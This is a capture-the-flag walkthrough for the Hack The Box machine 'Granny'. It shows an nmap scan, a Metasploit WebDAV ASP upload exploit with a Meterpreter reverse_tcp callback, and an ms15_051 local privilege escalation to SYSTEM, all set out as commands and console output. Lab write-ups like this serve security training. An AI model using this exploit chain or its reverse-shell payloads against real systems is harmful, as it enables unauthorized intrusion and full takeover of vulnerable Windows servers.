# Granny-HTB
Granny is a Windows machine that is rated as easy. This box is so similar to Granpa.
# Recon
I started by runing nmap scan on the box, and as we can see we have ```Microsoft IIS httpd 6.0```.
```
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sC -sV 10.10.10.15
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-01 16:05 EDT
Nmap scan report for 10.10.10.15
Host is up (0.029s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Server Date: Tue, 01 Sep 2020 20:08:26 GMT
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.39 seconds
```
# User Flag
Here is the Metasploit module: ```exploit/windows/iis/iis_webdav_upload_asp```

So set your options and run it.
```
msf5 > exploit/windows/iis/iis_webdav_upload_asp
msf5 exploit(windows/iis/iis_webdav_upload_asp) > options 

Module options (exploit/windows/iis/iis_webdav_upload_asp):

   Name          Current Setting        Required  Description
   ----          ---------------        --------  -----------
   HttpPassword                         no        The HTTP password to specify for authentication
   HttpUsername                         no        The HTTP username to specify for authentication
   METHOD        move                   yes       Move or copy the file on the remote system from .txt -> .asp (Accepted: move, copy)
   PATH          /metasploit%RAND%.asp  yes       The path to attempt to upload
   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS        10.10.10.15            yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT         80                     yes       The target port (TCP)
   SSL           false                  no        Negotiate SSL/TLS for outgoing connections
   VHOST                                no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.28      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```
Exploit:
```
msf5 exploit(windows/iis/iis_webdav_upload_asp) > exploit 

[*] Started reverse TCP handler on 10.10.14.28:4444 
[*] Checking /metasploit129308424.asp
[*] Uploading 611074 bytes to /metasploit129308424.txt...
[*] Moving /metasploit129308424.txt to /metasploit129308424.asp...
[*] Executing /metasploit129308424.asp...
[*] Sending stage (176195 bytes) to 10.10.10.15
[*] Deleting /metasploit129308424.asp (this doesn't always work)...
[!] Deletion failed on /metasploit129308424.asp [403 Forbidden]
[*] Meterpreter session 1 opened (10.10.14.28:4444 -> 10.10.10.15:1031) at 2020-09-01 16:13:20 -0400

meterpreter >
```
Let's migrate it to ```davcdata.exe```:
```
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]                                                
 4     0     System                                                          
 276   4     smss.exe                                                        
 324   276   csrss.exe                                                       
 348   276   winlogon.exe                                                    
 396   348   services.exe                                                    
 408   348   lsass.exe                                                       
 616   396   svchost.exe                                                     
 684   396   svchost.exe                                                     
 744   396   svchost.exe                                                     
 788   396   svchost.exe                                                     
 804   396   svchost.exe                                                     
 940   396   spoolsv.exe                                                     
 968   396   msdtc.exe                                                       
 1080  396   cisvc.exe                                                       
 1128  396   svchost.exe                                                     
 1184  396   inetinfo.exe                                                    
 1220  396   svchost.exe                                                     
 1332  396   VGAuthService.exe                                               
 1412  396   vmtoolsd.exe                                                    
 1432  1080  cidaemon.exe                                                    
 1464  396   svchost.exe                                                     
 1652  396   alg.exe                                                         
 1716  396   svchost.exe                                                     
 1812  616   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1908  396   dllhost.exe                                                     
 1940  1080  cidaemon.exe                                                    
 2140  1080  cidaemon.exe                                                    
 2284  616   wmiprvse.exe                                                    
 2316  1464  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 2384  616   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 2708  2316  svchost.exe        x86   0                                      C:\WINDOWS\Temp\radC332A.tmp\svchost.exe
 2788  1464  w3wp.exe                                                        
 3376  616   davcdata.exe                                                    

meterpreter > migrate 2384
[*] Migrating from 2708 to 2384...
[*] Migration completed successfully.
```
Let's run now ```local_exploit_suggester```:
```
msf5 exploit(windows/iis/iis_webdav_upload_asp) > use post/multi/recon/local_exploit_suggester
msf5 post(multi/recon/local_exploit_suggester) > set session 1 
session => 1
msf5 post(multi/recon/local_exploit_suggester) > exploit 

[*] 10.10.10.15 - Collecting local exploits for x86/windows...
[*] 10.10.10.15 - 34 exploit checks are being tried...
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```
So I tried all of them and only ```ms15_051_client_copy_image``` worked:
```
msf5 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms15_051_client_copy_image
msf5 exploit(windows/local/ms15_051_client_copy_image) > options 

Module options (exploit/windows/local/ms15_051_client_copy_image):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.28      yes       The listen address (an interface may be specified)
   LPORT     7777             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86
```
Run it:
```
msf5 exploit(windows/local/ms15_051_client_copy_image) > exploit 

[*] Started reverse TCP handler on 10.10.14.28:7777 
[*] Launching notepad to host the exploit...
[+] Process 1632 launched.
[*] Reflectively injecting the exploit DLL into 1632...
[*] Injecting exploit into 1632...
[*] Exploit injected. Injecting payload into 1632...
[*] Payload injected. Executing exploit...
[*] Sending stage (176195 bytes) to 10.10.10.15
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Meterpreter session 2 opened (10.10.14.28:7777 -> 10.10.10.15:1032) at 2020-09-01 16:18:38 -0400

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```
Now get User Flag:
```
meterpreter > shell 
Process 2456 created.
Channel 2 created.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\Documents and Settings\Lakis\Desktop>type user.txt
type user.txt
700c5dc16...f8703f67d1
```
# Root Flag
So at this point we don't need to do anything just grab your flag :)
```
C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
aa4beed1c...747bd06e9
```
Thank you for reading, and you can find me here on twitter: https://twitter.com/electronicbots
